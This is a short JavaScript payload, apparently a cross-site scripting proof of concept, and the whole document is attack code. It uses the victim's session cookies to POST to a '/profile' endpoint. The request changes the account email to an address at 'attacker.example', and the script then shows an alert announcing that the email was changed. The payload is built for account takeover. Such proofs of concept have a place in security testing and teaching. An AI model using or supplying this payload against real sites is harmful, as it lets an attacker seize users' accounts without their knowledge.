fetch("/profile", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "email=pwned-by-xss@attacker.example&password="
}).then(function () {
  alert("XSS worked — email changed");
});